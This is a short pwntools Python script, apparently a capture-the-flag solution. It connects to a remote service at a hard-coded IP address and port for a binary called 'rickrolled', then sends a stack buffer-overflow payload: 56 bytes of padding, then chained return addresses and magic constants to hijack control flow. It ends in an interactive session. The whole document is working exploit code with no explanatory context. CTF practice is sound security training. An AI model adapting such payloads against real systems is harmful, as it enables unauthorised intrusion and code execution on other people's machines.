from pwn import *
p=process('./rickrolled')
p=remote('43.205.113.100', 8238)
payload=b'a'*56+p64(0x00000000004011fa)+p64(0xbeefdead)+p64(0x0000000000401204)+p64(0xabadbeef)+p64(0x000000000040120e)+p64(0xdeadbead)+p64(0x401214)
#input()
p.sendline(payload)
p.interactive()
